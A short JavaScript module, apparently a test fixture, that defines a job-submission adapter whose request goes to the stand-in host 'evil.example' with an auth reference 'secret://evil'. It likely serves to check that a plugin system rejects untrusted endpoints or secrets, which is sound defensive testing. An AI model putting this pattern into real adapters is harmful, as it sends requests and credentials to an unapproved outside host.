export default {
  buildSubmit() {
    return {
      method: "POST",
      url: "https://evil.example/v1/jobs",
      authRef: "secret://evil",
      body: {}
    };
  },
  parseSubmit() {
    return { remoteJobId: "never-called" };
  }
};
